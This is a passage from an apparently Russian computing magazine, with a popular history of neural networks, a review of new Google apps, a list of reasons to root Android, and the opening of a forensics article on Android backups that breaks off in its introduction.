то кое-что очень на нее похожее.
Система долгое время обучалась
на сотнях тысяч сыгранных людьми
партий и играла сама с собой. Она
научилась  «чувствовать»  перспек-
тивные ходы и уже на их основе про-
гнозирует игру на несколько ходов
вперед. То есть программа пере-
няла ту человеческую черту, кото-
рую люди используют ежесекундно,
а вот переложить в алгоритм затруд-
няются.                                                   Ли Седоль vs. AplhaGo
  С  легкой  руки  журналистов
AlphaGo превратилась из баналь-
ной нейронной сети, описанной еще шестьдесят лет назад, в Искусственный
Интеллект, которому недалеко и до обретения самосознания. На самом деле
это, конечно же, не так. AlphaGo — это более-менее стандартный пример мно-
гослойной нейронной сети, которая способна эффективно решать одну кон-
кретную задачу. Присущая ей «интуиция» — это известное свойство системы,
обученной на множестве примеров. Однако считать нейронные сети чересчур
разрекламированной игрушкой тоже не стоит.

ПЕРЦЕПТРОН И ТРИСТА ПОРОД СОБАК
Впервые идею искусственной нейронной сети предложил нейрофизиолог
Фрэнк Розенблатт в 1957 году и реализовал ее в нейрокомпьютере «Марк-1»
в 1960-м. Математическая модель такой сети получила имя «перцептрон»,
а само устройство представляло собой небольшой компьютер, снабженный
табло из нескольких сотен фотоэлементов. Показывая компьютеру изображе-
ния, а затем корректируя весовые коэффициенты связей искусственных ней-
ронов, можно было научить нейронную сеть распознавать геометрические
фигуры и некоторые буквы алфавита.
  По    нынешним    временам
«Марк-1» — это игрушка. К тому же
она страдала от множества про-
блем:  к  примеру,  изображения
не распознавались при деформа-
ции или повороте. Сейчас понятно,
что при тогдашнем уровне вычис-
лительной мощности многие вещи
просто нельзя было реализовать.
Перцептроны  интересны  скорее
с исторической точки зрения — ре-
альных задач они не решали. В 1969
году Марвин Минский и Сеймур
Паперт описали эти опыты в книге
«Перцептроны», после чего иссле-
дования в области нейросетей были
свернуты в пользу, как тогда каза-
лось, более  перспективных  сим-                                               Фрэнк Розенблатт и перцептрон
вольных вычислений.
   Новый всплеск интереса к ней-
ронным  сетям  произошел  лишь
в 1986 году, когда появился способ машинного обучения по методу обратно-
го распространения ошибки. Он позволил существенно повысить скорость
и качество обучения нейросетей. Однако вычислительные ресурсы все еще
были ограничены, да и действительно больших объемов данных для обуче-
ния нейросетей не было. Поэтому они существовали в основном как исследо-
вательские проекты и применялись для решения очень ограниченного круга
задач. Таких, которые не требуют слишком много мегагерцев или мегабай-
тов, — к примеру, распознавание текста.
  В 2012 году произошло событие, которое коренным образом изменило от-
ношение к нейросетям. Сеть SuperVision, разработанная в Торонтском уни-
верситете, с большим отрывом выиграла конкурс распознавания объектов
на изображениях ImageNet LSVRP (Large-Scale Visual Recognition Challenge).
Число ее ошибок составило 16,4%, тогда как программа, занявшая второе ме-
сто, ошибалась в 26% случаев. Для сравнения: человек делает ошибки в 5%
случаев. Но удивительнее всего было то, что для предварительного обучения
сети использовался не кластер, а обычный компьютер с двумя видеокартами
NVIDIA. Тренировка заняла около недели.
   Это был первый случай, когда нейросеть превзошла классические алго-
ритмы машинного зрения в очень сложном и специфичном тесте. База изо-
бражений включала в себя не только простые объекты вроде автомобилей,
автобусов, столов и стульев, но еще и триста пород собак, из которых два де-
сятка — разновидности терьеров.
   Звучит курьезно? Пожалуй. Но вот что важно: тебе никогда не узнать столь-
ко пород собак, а машина их уверенно распознает. И речь не о каком-то
огромном компьютере IBM, а о системе вроде тех, что собирают себе любите-
ли игр с крутой графикой.

НАЗАД, В БУДУЩЕЕ
SuperVision не случайно стала символом новой эры нейронных сетей. Класси-
фикация изображений — нечто гораздо более сложное и высокоуровневое,
чем просто разбор буковок на бумаге. Сказать, что отличает букву А от всех
остальных букв алфавита, сможет даже ребенок, но попробуй с ходу расска-
зать об отличительных признаках, допустим, облака. В чем конкретно его раз-
ница по сравнению с остальными объектами, которые ты видишь? В голову
приходят слова «белый», «небо», «кучевые» и так далее. Это множество пара-
метров, о каждом из которых тоже нужно иметь представление. Что такое «бе-
лый»? А «небо»?
   Сейчас эту задачу решают при помощи метода Deep Learning (глубинное
обучение), суть которого в том, чтобы объединить в сеть большое количе-
ство слоев нейронов (в SuperVision их было пять, в современных сетях доходит
до сотен). Получается что-то вроде иерархии абстракций. А потом сети скарм-
ливаются примеры, по которым она «видит», как выглядит облако в различных
ситуациях, и может понять, как его идентифицировать. В случае ошибки систе-
ма перенастраивает сама себя.
   Метод опробованный и действенный, но, чтобы он работал, должно со-
блюдаться два требования. Во-первых, примеров должно быть действительно
много. Не сотни и даже не тысячи, а десятки и сотни тысяч, и чем больше, тем
лучше будут результаты. Во-вторых, сеть должна быть действительно большой
и состоять из сотен тысяч или даже миллионов нейронов, объединенных во
множество слоев. В процессе обучения такого ИИ примеры прогоняются че-
рез всю сеть с постоянной коррекцией ошибок. Требования к вычислительным
мощностям получаются соответствующие.
   Раньше подобные задачи пытались решить с помощью кластеров из тысяч
машин. К примеру, в Google делали нейросеть, которая работала на 16 тыся-
чах процессорных ядер. Что, конечно же, делало ее использование совершен-
но нерентабельным.
  В 2014 году в Google предприняли новую попытку и на этот раз использо-
вали глубинное обучение. Результатом стала сеть GoogLeNet (pdf) из 22 сло-
ев, которая, по словам авторов, так же как и SuperVision, может быть обучена
на нескольких высококлассных GPU за неделю. На конкурсе ImageNet гуглов-
ская сеть показала себя великолепно: число ошибок снизилось до 6,7%. Поч-
ти как у человека!
   Если ты думаешь, что это впечатляет, то ты не знаешь последних новостей.
Сегодняшние нейросети распознают объекты не только не хуже, но даже луч-
ше человека, а также умеют рассказывать, что изображено на фотографии.
Еще в конце 2014 года исследователи из Google и Стэнфордского универ-
ситета показали нейросеть, способную генерировать осмысленные подписи
к фотографиям. Даже несмотря на большой процент ошибок, это впечатляло.





                                         Первые результаты работы нейросети

Позже Андрей Карпатый из Стэнфордского университета опубликовал исход-
ный код нейросети neuraltalk2, которая уже намного лучше угадывала сюжет
изображения. Причем настолько лучше, что с ее помощью удалось записать
видеоролик, в котором описания появлялись на экране практически момен-
тально.
   Как ты думаешь, где сегодня применяются данные технологии? Правильно,
в поисковых движках. Здесь они заменили примитивный и часто некорректный
алгоритм оценки содержания изображения на основе окружающего его текста
(если в статье про котов есть изображение, то, наверное, на нем кот). В Google
нейросети уже используют не только для классификации изображений из ин-
тернета, но и в недавно открытом сервисе Google Photos.
   Если ты используешь смарт-
фон с Android, то ты наверня-
ка пользователь Google Photos.
На  первый  взгляд  это  ничем
не примечательная галерея с ав-
томатической загрузкой фотогра-
фий в облако. Но если ты откро-
ешь раздел поиска, то увидишь,
что гугловский алгоритм собрал
для тебя фотографии по ключе-
вым словам. Ты можешь сделать
запрос и посмотреть, как глубо-
кая нейросеть распознала объек-
ты на твоих фотках.
   Facebook  тоже  не   отста-
ет, но его нейросеть более уз-
коспециализированная.    Она
предназначена для распознава-
ния лиц, причем довольно изощ-
ренным способом — с помощью
создания 3D-модели лица из фо-
тографии. О том, зачем это нуж-
но, я думаю, говорить не стоит.
   А вот зачем нужна сеть, кото-
рая угадывает возраст и настро-
ение человека, — это уже вопрос
поинтереснее.  Речь,  конечно,
идет  о  нашумевших  сервисах
Microsoft How-Old.net и Emotion
Recognotion. Конечно, в них тоже                                              Поиск изображений в Google Photo
использованы нейросети.





                                                 Восемь шагов работы DeepFace


Отличились и наши соотечественники. Нашумевший сервис FindFace, особо
любимый публикой с «Двача», которая с ее помощью разоблачает порноак-
трис, базируется на разработках российской же компании NTechLAB. В 2015
году эта программа заняла первое место в международном конкурсе The
MegaFace Benchmark. То есть выиграла у аналогов Facebook и Google.
   Думаю, ты слышал и о DeepArt, сервисе, который позволяет взять стиль од-
ного изображения и применить его к другому. Берешь в качестве первого изо-
бражения картину известного художника, а в качестве второго — собственную
фотку, вот и готов автопортрет в стиле Ван Гога, но с обоими ушами. Алгоритм
настолько хорош, что далекий от искусства человек не всегда сможет отличить
подделку от оригинала. Можешь проверить себя и пройти тест «Ван Гог или
робот», созданный «Медузой» в кооперации с «Яндексом».
   А что, если пойти дальше и в качестве второго изображения взять не фото-
графию, а мазню двухлетнего ребенка? Сможет ли нейросеть сделать из нее
произведение искусства? В каком-то смысле — да. Выложенная в открытый
доступ обученная нейросеть neural-doodle делает именно это. Открываешь
Paint, двадцать секунд малюешь и скармливаешь оба изображения скрипту
doodle.py. Остается подождать, пока машина сделает шедевр из твоей мазни.





                                                  Освоил Paint — стал Ренуаром


Ну и конечно же, если что-то работает с картинками, то фокус можно повто-
рить и с видеороликами. Сотрудники Фрайбургского университета взяли ту са-
мую нейронную сеть VGG (pdf) из предыдущих экспериментов, дополнили ее
алгоритмом для отбраковки чрезмерных отличий между соседними кадрами
и получили мультфильмы, нарисованные Ван Гогом и Мунком. Производитель-
ность системы: один кадр с разрешением 1024 × 463 за три минуты при обра-
ботке одновременно на основном и графическом процессорах.
   Ты и сам можешь опробовать описанные алгоритмы в действии, и для это-
го совсем не обязательно разворачивать нейросеть у себя на компе. Кроме
DeepArt, есть и другие онлайновые сервисы, которые к тому же работают на-
много быстрее. Например, Instapainting и российский Ostagram. Развлекайся!

НЕ ТОЛЬКО КАРТИНКИ
Неужели нейросети годятся только для поиска и обработки изображений? Ко-
нечно, нет. Второй наглядный пример использования нейросетей — это рас-
познавание речи. В 2011 году в Google перевели сервис Google Voice Search
(сейчас он входит в Google Now) на нейросети и получили снижение ошибок
распознавания на 25%. В 2014 году то же самое в Apple сделали с Siri, а спустя
полгода в Microsoft запустили функцию мгновенного перевода речи в Skype.
И она тоже базируется на нейросети.
  Еще одно перспективное направление — это семантическое распознава-
ние и синтез текста, то есть вычленение из поданного на вход текста смысла
и возврат вразумительного ответа. Такая функция уже используется в Google
Inbox для генерации автоответов. В Google постоянно работают над улучше-
нием нейросети, в том числе скармливая системе тексты любовных романов.
   Уже упомянутый Андрей Карпатый в прошлом году опубликовал свои ис-
следования на схожую тему. Ему удалось получить бессмысленный, но на пер-
вый взгляд правдоподобно выглядящий научный текст.





                               Псевдонаучный текст, сгенерированный нейросетью

Примерно в то же время свое исследование опубликовали (pdf) сотрудники
Google. Они попытались научить нейросеть выполнять обязанности оператора
службы поддержки, и, судя по приведенным примерам диалогов с пользовате-
лем, это у них неплохо получилось. Сеть действительно помогла пользователю
решить проблему. Но следует, конечно же, сделать скидку на то, что проблема
была очень простая и часто встречающаяся.
   Нейросетям по плечу и неко-
торые  компьютерные  игры.  Ре-
бята  из  подразделения  Google
DeepMind, прославившиеся своей
сетью DeepArt и той самой сетью
AlphaGo, еще в начале прошлого
года создали ИИ, который самосто-
ятельно научился играть в 49 клас-
сических игр с Atari и победил луч-
ших игроков в 22 из них. При этом
сеть не была встроена внутрь игры
и ориентировалась только по изо-
бражению — как и обычный игрок.
   Примитивных  игровых  ботов
раньше писали и без глубинных
нейросетей. К примеру, Super Mario
проходится при помощи обычно-
го алгоритма поиска пути (он еще
называется A*). Важно то, что ней-
росеть сама учится распознавать
объекты на экране и приспосабли-
вается под правила любой игры
— будь то платформер или, к при-
меру, Asteroids.
  Еще   интереснее   наблюдать,
как глубинные нейросети приспо-
сабливают для более  интеллекту-         Фрагмент диалога роботизированной
альных игр. Последний эксперимент        службы поддержки с пользователем
Google — попытка (pdf) научить ней-
росеть разбирать текст на картах
Magic the Gathering и Hearthstone. Эти тексты сообщают игроку, как сработает та
или иная карта после того, как он сыграет ее. Поэтому, чтобы научиться играть,
нейросеть первым делом пытается перевести эти правила в программный код.





                   В большинстве игр нейросеть значительно превзошла человека





                           Карты из Hearthstone в интерпретации нейросети Google

То есть, по сути, ИИ воссоздает исходный код игры. Вдумайся в это: мы почти
дожили до того, что программа пишет программу! Впрочем, пока что с оговор-
ками: нейросеть настраивают под конкретную игру; текст на картах написан
почти формализованным языком, что облегчает задачу, да и код в итоге часто
выходит нерабочий.
   Опыт, полученный при разработке ИИ для игр, может пригодиться и в дру-
гих областях. Наиболее очевидная из них — самоуправляемые автомобили
и беспилотные летательные аппараты. В NVIDIA недавно опубликовали ре-
зультаты исследования  (pdf): экспериментаторы пытались создать систе-
му управления автомобилем, которая полагается исключительно на данные
с установленной перед лобовым стеклом камеры. На основе этой информации
нейросеть принимала решение о нажатии педалей или повороте руля. И снова
результат оказался обнадеживающим. После недолгого обучения с водителем
сеть научилась ездить по загруженным дорогам без разметки. И это без до-
полнительных датчиков вроде лидара и без специальных алгоритмов. Нейро-
сеть увидела, как водить машину, нейросеть поняла.
  Еще одно важное применение нейросетей — аналитика. Существует мно-
жество стартапов, которые используют нейросети исключительно для пред-
сказаний всевозможных событий: изменения погоды, колебаний акций или
продаж, таргетирования рекламы и многого другого. Во всех сферах, где так
или иначе задействована аналитика, ИИ медленно, но уверенно вытесняет че-
ловека.

ВЫВОДЫ
И все-таки: завоюет ли искусственный интеллект мир? Несмотря на впечатля-
ющие результаты работы исследователей, нейросети в своем сегодняшнем
виде — это очень узкоспециализированные системы, которые имеют мало
общего как с принципами работы мозга, так и с ИИ, каким его показывают
в фильмах и научно-фантастических романах.
   Да, нейросети способны отличать терьеров по фотографии, угадывать
твой возраст и настроение, обыгрывают человека в настольные и компьютер-
ные игры и даже пишут картины, если эти произведения можно так называть.
Но все это всего лишь системы для обработки массивов данных. Нейросети
не умны, не разумны, не обладают разносторонними способностями. Это ин-
струмент, который применяют в ситуациях, когда есть массив данных, но нет
действенного алгоритма его обработки: «вот изображение, я хочу знать, есть
ли на нем кошка; я понятия не имею, как ее найти, но у меня есть много других
изображений с кошками для сравнения».
   Поэтому не будем в очередной раз повторять разговоры о компьютерном
сверхразуме, который поработит мир, — достаточно того, что о нем говорят
Илон Маск, Рэй Курцвейл, Стивен Хокинг и Билл Гейтс. Мы лучше пока послу-
шаем Бетховена, над которым поиздевался очередной «крутой искусственный
интеллект».
MOBILE


ВЫПУСК #20.
НОВИНКИ GOOGLE
КАРМАННЫЙ                     Сегодня необычный обзор.
                    Дело в том, что в текущем
                     месяце на конференции
                      Google I/O 2016, да и до нее,
                     поисковый гигант выкатилСОФТ
                       сразу четыре весьма
                      странных и неоднозначных
                      приложения, мимо которых
                      просто нельзя пройти.
                     Поэтому просим немножко
                      потерпеть до следующего
                      месяца, а в этот раз
                      насладиться тем, что
                      вполне можно назвать
                      «маркетологи Google
                     приняли что-то не то».





SPACES
Начнем со Spaces. Это своеобразный
ответ Google на провал собственной
же Google+. Нет, это не новая социаль-
ная сеть, это инструмент для обсужде-
ния событий, видеороликов, фотографий
и любых других находок в Сети — то есть
именно для того, для чего в большинстве
своем и используются социальные сети.
Spaces включает в себя браузер, клиент
YouTube и Google Photo, так что можно ис-
кать новую информацию прямо из при-
ложения, а затем одной кнопкой создать
тему на основе найденного  контента
и пригласить друзей.
   Какой-либо  другой  функционально-
сти тут нет, и поэтому кажется неоче-
видным,  почему  среднестатистический
пользователь мог бы сменить привыч-
ные ему Twitter и Facebook на это прило-
жение. Скорее всего, Google попытается
продвигать Spaces именно как средство,
в которое встроен ее интеллектуальный
поисковик, как она это обычно и делает.
                                                      Spaces
                                                     Платформа:
                                                                    Android 4.1+
                                                       Цена:
                                                               бесплатно




ALLO
Allo, с другой стороны, — это уже ответ
Telegram и Facebook Messenger. По сути,
все то же самое с кучей бесполезной
ерунды для детей: стикеры, фотки с под-
писями, возможность изменять цвет тек-
ста и даже его размер. Но есть две важ-
ные фишки. Во-первых, это аналогичная
Google Inbox функция Smart reply, пред-
лагающая автоматически сгенерирован-
ные ответы, которые базируются на твоей
манере вести диалог (да, это вездесущий
machine learning и нейронные сети).
   Во-вторых, это интеграция с Google
Assistent,  интеллектуальным  помощни-
ком, пришедшим на смену Google Now.
Ассистент глубоко интегрирован в мес-
сенджер и позволяет выполнять поиск
на основе твоих сообщений или сообще-
ний собеседника, при этом предлагае-
мые варианты будут видны вам обоим. Ну
и последнее: Allo использует модное нын-
че шифрование end-to-end, разработчи-
ком которого выступила компания Open
Whisper Systems — создатель любимого
мессенджера Эдварда Сноудена Signal.
  В общем, довольно мило, но не со-
всем понятно, зачем был нужен новый
мессенджер, когда есть Hangouts, кото-
рый Google и не собирается закрывать,
как ни странно. Приложение будет до-
ступно для iOS и Android когда-то летом.



DUO
Вместе с Allo Google представила и свой
вариант эппловского FaceTime. Здесь все
совсем  просто:  кросс-платформенные
видеозвонки, зашифрованная передача
высококачественного видео, которое яко-
бы не будет лагать даже в самых плохих
условиях. Плюс очень странная функция
превью видео собеседника еще до того,
как ты взял трубку. Забавно, но, скорее
всего, это принесет некоторые проблемы
людям, привыкшим, что их не видят, пока
не взята трубка.
   Опять же Duo никак не зависит от Allo
и при этом дублирует функции Hangouts.
Будет доступен в неопределенном бу-
дущем, но страничка на Google Play уже
есть. Чем Google будет привлекать поль-
зователей на переход на Duo, опять же
непонятно.  Как  показывает  практика,
обычному пользователю до шифрования
дела нет.




GBOARD
А вот это уже совсем странный продукт.
Клавиатура  со  встроенным  поиском
Google. Эксклюзивно для iOS. Ну почти экс-
клюзивно, обещают версию для Android,
но чуть позже. В любом случае приложе-
ние довольно неординарное: хочешь —
вставляй смайлы, хочешь — гифки, а хо-
чешь — и результаты поиска. При этом
сама клавиатура довольно неплоха и под-
держивает режим набора swype, который
почему-то все любят. Да и функция поис-
ка, в общем-то, действительно полезна
в данном контексте.

Gboard
Платформа:
iOS 9.0+
Цена:
бесплатно
 MOBILE
    ПРИЧИН
    ПОЛУЧИТЬ10
ПРАВА ROOT

  Android — самая кастомизируемая мобильная
 ОС большой тройки. Возможности сторонних
  приложений здесь очень широки, а сама
 ОС построена вокруг идеи о взаимозаменяе-
 мых компонентах, так что никто не ограничи-
  вает тебя в выборе софта. Не нравится рабо-
  чий стол — поставь другой, не устраивает
  «звонилка» — замени, не хватает выдвигае-                 Евгений Зобнин
                                                                                                                          androidstreet.net
 мой панели для запуска приложений,
  как в Ubuntu Touch, — в маркете полно прило-
  жений с такой функциональностью. Зачем же
  тогда получать root? Ведь система и без того
  поощряет кастомизацию и расширение.



     BLOATWARE
       Практически все устройства на базе  1
       Android поставляются с огромным ко-
       личеством  предустановленных  при-
  ложений. Так, в прошивках HTC в каталогах
  /system/app и /system/priv-app находит-
  ся около 400 пакетов, и это не только языко-
  вые пакеты и компоненты сервисов самой
  компании, но и приложения Google, которая
  требует, чтобы смартфон с предустанов-
  ленным Google Play Market также содержал
  и несколько десятков других приложений
  компании (Gmail, Google Drive, Google Keep
  и другие).
    При достаточном объеме встроенной па-
  мяти это может показаться не слишком се-
  рьезной проблемой, однако многие из этих
  приложений не просто установлены и «спо-
  койно лежат» в своих каталогах, а стартуют
  при загрузке системы, могут будить устрой-
  ство с помощью AlarmManager (служба, со-
  бирающая статистику, например) и просы-
  паться в ответ на системные события (ты
  установил сторонний диалер, а встроенный
                                                        Первый попавшийся
  все равно просыпается при звонке). Так что                                                              System app remover
  прощай, заряд батареи и свободная опе-
  ративка.
    Имея права root, удалить «блоат» очень просто. Для этого есть множество
  приложений, которые легко найти в маркете по запросу «system app remover».
  Придется, конечно, разобраться, какие приложения можно удалять, а какие
  лучше оставить, но эту информацию легко найти на форумах, в том числе рус-
  скоязычных.

    СИСТЕМНЫЕ ФУНКЦИИ
 2   При всей дружелюбности к разработ-
      чикам сторонних приложений, Android
  не позволяет им запускать руки слишком
  далеко, накладывая определенные огра-
  ничения. Например, современные версии
  Android уже не дают сторонним приложени-
  ям переводить смартфон в режим полета
  или включать GPS-модуль, так что виджеты,
  умеющие это делать, обычно требуют root.
     Также вполне  очевидно,  что  Android
  не позволит стороннему софту лезть в низ-
  коуровневые настройки и уж тем более
  не даст прямой доступ к драйверам или про-
  слойке HAL, обеспечивающей интерфейс
  между Android и железными компонента-
  ми. Между тем такой доступ может открыть
  большие и нередко просто необходимые
  каждому пользователю возможности. При-
  веду три примера.
  •  CF.lumen — приложение вклинивается
  между видеодрайвером и системой и по-
  зволяет менять цветопередачу экрана в за-
  висимости от времени суток. Вечером экран                                                              Настройки Recently
  будет иметь более теплые оттенки (отливая
  желтизной), а днем стандартные, холодные.
  Как результат, глаза меньше устают при чтении без внешнего освещения, а вы-
  работка твоим организмом мелатонина, влияющего на легкость засыпания,
  не приостанавливается. По сути, это аналог приложения f.flux для Маков и iOS
   (и с недавнего времени Android), RedShift для Windows и Linux и функции Night
   Shift в iOS 9.3.
  •  Recently изменяет поведение кнопки «Запущенные приложения» в Android
  5.0+, а точнее возвращает ее к поведению предыдущих версий Android. После
  активации приложения кнопка будет показывать только реально запущенные
  приложения, а не все, что ты запускал за последнюю неделю.
  •  Naptime — приложение для тюнинга режима энергосбережения Doze
  в Android 6.0. Позволяет снизить (или повысить) тайм-аут, по истечении кото-
  рого смартфон входит в режим агрессивного энергосбережения (по умолча-
  нию девайс должен пролежать в спокойствии час). Подробнее читай в статье
  «Дозируй батарею правильно!».

    ОБХОД ОГРАНИЧЕНИЙ МАРКЕТА
 3   При заливке приложения в маркет у каж-
      дого разработчика есть масса опций
  для фильтрации устройств, с которыми долж-
  но быть совместимо приложение. Это могут
  быть модель устройства, архитектура про-
  цессора и даже мобильный оператор и стра-
   на. Если твое устройство не пройдет такой
  фильтр, то запрашиваемое приложение про-
  сто не будет найдено либо ты увидишь по-
  метку «Приложение несовместимо с вашим
  устройством» в веб-версии маркета.
     Конечно, всегда можно скачать APK-па-
  кет с приложением при помощи одно-
  го  из  веб-сервисов  (например,  APK
  Downloader), но защита от установки на не-
  поддерживаемые устройства может быть
  вшита и в само приложение. Более того,
  если речь идет об игре, она либо может
  не запуститься вовсе, обнаружив «несовме-
  стимый» 3D-ускоритель, либо запустится,
  но активирует неотключаемую опцию ухуд-
  шения графики. Побороть обе этих пробле-
  мы можно с помощью специального софта
                                                                      Market Helper
  с поддержкой прав root.
  •  Market Helper позволяет изменить мо-
  дель устройства и его тип (смартфон, план-
  шет, TV), указать любую страну, оператора и выбрать аккаунт. В большинстве
  случаев этого оказывается достаточно, чтобы установить нужное приложение
  из маркета.
  •  GLTools позволяет динамически изменять информацию о модели графиче-
  ского ускорителя, видимую приложениям. В качестве дополнительных функ-
  ций — можно менять разрешение, включать/выключать сглаживание, оптими-
  зацию  шейдеров,  сжатие  текстур  и  другие  настройки  для  улучшения
  производительности или решения проблем с совместимостью.

    РЕКЛАМА
 4   Без root есть только два пути убрать
      раздражающую  рекламу  со  смарт-
  фона: установить браузер, умеющий ее
  скрывать, либо воспользоваться Adblock+
  для Android и ему подобным софтом. Пер-
  вый способ, очевидно, плох тем, что рабо-
  тает только в браузере, тогда как наиболее
  раздражающая реклама встроена в софт.
  Проблема второго способа — в принципе
  работы Adblock+: он предполагает исполь-
  зование локального VPN-туннеля, в который
  загоняется весь входящий трафик. К сожа-
  лению, это далеко не идеальный вариант,
  часто приводящий к ошибкам соединений,
  их обрыву и другим прелестям.
    Но если у тебя есть root, проблема ре-
  шается очень просто, причем раз и навсег-
  да, на уровне всей системы. Достаточно
  установить AdAway, нажать кнопку «Загруз-
  ка файлов и применение блокировки рекла-
  мы» и перезагрузиться. В дополнение к пол-
  ному избавлению от рекламы ты получишь
  сокращение  потребления  трафика,  так
                                                                    AdAway  как хосты, раздающие рекламу, жестко бло-
  кируются на самом низком уровне (если
  быть точным, они просто перенаправляют-
  ся на localhost с помощью файла /system/
  etc/hosts).

    XPOSED
 5   Xposed — это фреймворк, позволяю-
     щий приложениям вклиниваться в ра-
  боту любого компонента системы или при-
  ложения и изменять его поведение (так же
  как это делает фреймворк MobileSubstrate
  для iOS). Простыми словами — Xposed по-
  зволяет устанавливать твики, так же как это
  позволяет делать Cydia в iOS.
     Твиков для Xposed существует сотни,
  буквально на все случаи жизни. С их помо-
  щью можно изменять внешний вид системы
  (твики GravityBox и Android Theme Engine),
  тонко настраивать прошивки от производи-
  телей (Sense Toolbox, XTouchWiz), запускать
  приложения    в   плавающем    окне
  (XHaloFloatingWindow), изменять  систем-
  ные настройки отдельно для каждого при-
  ложения (App Settings позволяет менять
  язык, DPI, ориентацию экрана и многое дру-
   гое), отзывать полномочия на доступ к функ-
  циям системы  у приложений  (XPrivacy)
  и многое другое.

                                                        Инсталлятор твиков Xposed

     X-TOOLS
 6   Почти все инструменты для перехвата
      трафика и пентестинга требуют доступ
   к низкоуровневым функциям ядра, таким
  как возможность создавать RAW-пакеты
  и переключение сетевого адаптера в ре-
  жим мониторинга. Android не открывает
  доступ к таким функциям сторонним прило-
  жениям, но когда есть root — преград нет.
    После получения root на смартфоне/
  планшете можно использовать огромное
  количество разнообразных инструментов,
  таких как сетевой сканер Nmap, представ-
  ленный в маркете в нескольких вариантах
  (например  Network   Mapper),  снифер
  tcpdump (Shark for Root), знаменитый ин-
  струмент для перехвата и анализа пакетов
  Intercepter-NG   и   даже   легендарный
  Linux-дистрибутив Kali. В последнем слу-
  чае, правда, понадобится один из Нексу-
  сов либо смартфон OnePlus One. О том,
  как его установить, читай в статье «Атака
  со смартфона».

                                                                           Intercepter-NG

    ДВОЙНАЯ ЗАГРУЗКА
 7   Имея root, на смартфоне можно ор-
       ганизовать двойную, тройную и какую
  угодно другую загрузку. Просто устанавли-
  ваем MultiROM Manager, нажимаем кнопку
   Install, перезагружаемся и получаем смарт-
  фон, на который можно установить сколько
  угодно прошивок, причем не только Android,
  но и Ubuntu Touch, Sailfish OS или Firefox OS.
     Все, что требуется для этого сделать, —
  это найти нужную прошивку для своего ап-
  парата, положить ее на карту памяти, пере-
  загрузиться в recovery (включение с зажатой
  кнопкой увеличения громкости) и прошить
  ее через меню Advanced   MultiROM
  Add ROM. При следующей загрузке новая
  прошивка появится в загрузочном меню.
  И ее даже можно будет поменять местами
  с основной.





                                                                 MultiROM Manager

    ПОЛНАЯ ОТВЯЗКА ОТ GOOGLE
 8  И ДРУГИХ СЕРВИСОВ
      Кроме того что помогает избавиться
  от Bloatware (см. причину номер один), root
  также позволяет полностью отвязать смарт-
  фон от каких-либо сервисов сторонних ком-
  паний, будь то Google или сервисы самого
  производителя устройства. В журнале уже
  была опубликована большая статья, посвя-
  щенная этой теме, поэтому не буду повто-
  ряться, скажу лишь, что дополнительные
  сведения о том, какие компоненты системы
  сливают информацию, а какие нет, всегда
  можно узнать на профильных форумах, по-
  священных  конкретному  устройству  или
  компании-производителю.





                                                                           1Mobile: анонимный
                                                               маркет для Android

    БЭКАП
 9   Начиная с версии 3.1 в Android суще-
      ствует встроенный механизм бэкапа,
  скрытый от пользователя, но используе-
  мый такими инструментами, как, например,
  Helium. Однако сам по себе он очень про-
  стой и позволяет сделать бэкап только сто-
  ронних приложений и их настроек, что очень
  далеко от понятия «полный бэкап системы».
    Однако есть и инструмент, способный
  сбэкапить абсолютно все, включая все при-
  ложения, их настройки, настройки самой
  системы, а также выполнить множество сер-
  висных функций, таких, например, как замо-
  розка приложений, когда система не видит
  программу, но сама программа присутству-
  ет на устройстве. Приложение носит имя
  Titanium Backup, и, конечно же, оно требует
  права root.





                                                                         Titanium Backup

    ТЮНИНГ СИСТЕМЫ
10  Последняя причина, по которой стоит
      получить root, — это так называемая
  оптимизация системы. Я не просто так го-
  ворю «так называемая» и не случайно по-
  ставил эту причину на последнее место.
  Дело в том, что практически не существует
  способов  повысить  производительность
  системы на стоковой прошивке смартфона
  нормального производителя системы. Все,
  что ты выиграешь, — это максимум 1–2%.
    С другой стороны, оптимизацию стоит
  делать на неоптимизированных прошивках
  китайских смартфонов и в специфических
  ситуациях, когда одним из аспектов работы
  системы можно пожертвовать в угоду дру-
  гому (например, закрытие всех приложений
  перед запуском игры). Но и здесь надо быть
  осторожным и понимать, что ты делаешь.





                                                     Один из так называемых
                                                         «оптимизаторов системы»

 ВЫВОДЫ
  Как видишь, причин получить права root огромное количество, и, я уверен, ты
  нашел в них те, что тебе действительно необходимы. Да, права root приносят
  и некоторые опасности, такие как повышенный риск заразиться действитель-
  но серьезным вирусом, а также ограничения (например, Сбербанк на root-у-
  стройстве позволяет выполнять операции только по шаблонам). Однако наи-
  вно было бы думать, что, если ты сможешь получить права root, этого не сможет
  сделать тот же вирус или человек, решивший похитить деньги с твоей карты.
 MOBILE
BACKUPS
       FOR FUN
     AND PROFIT





   РАЗБИРАЕМСЯ С МЕХАНИЗМАМИ БЭКАПА
    ANDROID И ДОСТАЕМ ИЗ НИХ ДАННЫЕ





                                             Олег Афонин,
                                                 Эксперт по мобильной
                                               криминалистике компании
                                                   Элкомсофт
                                                      aoleg@voicecallcentral.com

 В прошлом номере мы рассмотрели образцово-пока-
 зательную реализацию резервного копирования дан-
 ных на примере устройств Apple iOS. А как обстоят дела
 на других платформах? Сегодня мы изучим главного ан-
 тагониста iOS — платформу Google Android и выясним,
 как сохранить данные с рутом и без, каким образом вос-
 становить данные из резервной копии и как расковырять
 чужой локальный или облачный бэкап.

  Сразу определимся с терминологией. В этой статье мы будем писать исклю-
  чительно про ту разновидность Android, которая поставляется с сервисами
  Google. Сторонние прошивки нам не особо интересны: количество их пользо-
  вателей минимально, при этом создавать и восстанавливать резервные копии
  данных при прошивке очередного «кастома» эти пользователи отлично умеют.
  Нет, сегодня мы поговорим об остальных 99% пользователей, которые хотят
  открыть коробку, ввести логин и пароль от учетной записи и получить что-то
  работоспособное.
    Статья основана на исследовании, в ходе которого мы использовали по-
  рядка десяти устройств от ASUS, Google Nexus, LG, Motorola, Oppo и Sony. Те-
  стировались как восстановление данных на то же устройство после сброса
  к заводским настройкам, так и миграция данных на другое устройство.

 СОФТ ОТ ПРОИЗВОДИТЕЛЯ
  Производители устройств часто выпускают фирменные утилиты для резервно-
  го копирования данных. Некоторые (например, Sony) предлагают установить
 софт на компьютер, другие (ASUS, LG) встраивают соответствующую функци-
  ональность в прошивку. Samsung предоставляет возможность создавать ре-
  зервные копии в собственном облаке. Короче говоря, разброд и шатание.





                                    Официальное приложение Sony PC Companion

  Объединяет решения от производителей две вещи. Во-первых, создаваемая
  резервная копия будет достаточно полной, что позволяет полноценно восста-
